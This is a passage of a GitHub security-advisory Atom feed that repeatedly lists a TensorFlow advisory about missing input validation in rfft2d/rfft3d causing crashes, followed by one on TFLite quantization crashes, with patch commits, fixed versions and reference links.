<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Incomplete validation in signal ops leads to crashes]]></title>
        <id>https://github.com/advisories/GHSA-5889-7v45-q28m</id>
        <link href="https://github.com/advisories/GHSA-5889-7v45-q28m"/>
        <updated>2022-05-24T22:16:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href="https://github.com/tensorflow/tensorflow/pull/55274">#55274</a>).</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/55263">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29213">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/55263">https://github.com/tensorflow/tensorflow/issues/55263</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/pull/55274">https://github.com/tensorflow/tensorflow/pull/55274</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5889-7v45-q28m">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5889-7v45-q28m</uri>
        </author>
        <published>2022-05-24T22:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Core dump when loading TFLite models with quantization]]></title>
        <id>https://github.com/advisories/GHSA-8wwm-6264-x792</id>
        <link href="https://github.com/advisories/GHSA-8wwm-6264-x792"/>
        <updated>2022-05-24T22:16:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Certain TFLite models that were created using TFLite model converter would crash when loaded in the TFLite interpreter. The culprit is that during quantization the scale of values could be greater than 1 but code was always assuming sub-unit scaling.</p>
<p>Thus, since code was calling <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123"><code>QuantizeMultiplierSmallerThanOneExp</code></a>, the <code>TFLITE_CHECK_LT</code> assertion would trigger and abort the process.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8">a989426ee1346693cc015792f11d715f6944f2b8</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported externally via a <a href="https://github.com/tensorflow/tensorflow/issues/43661">GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8wwm-6264-x792">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8wwm-6264-x792</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29212">https://nvd.nist.gov/vuln/detail/CVE-2022-29212</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/issues/43661">https://github.com/tensorflow/tensorflow/issues/43661</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8">https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8wwm-6264-x792">https://github.com/advisories/GHSA-8wwm-6264-x792</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8wwm-6264-x792</uri>
        </author>
        <published>2022-05-24T22:16:08.000Z</published>
    </entry>
</feed>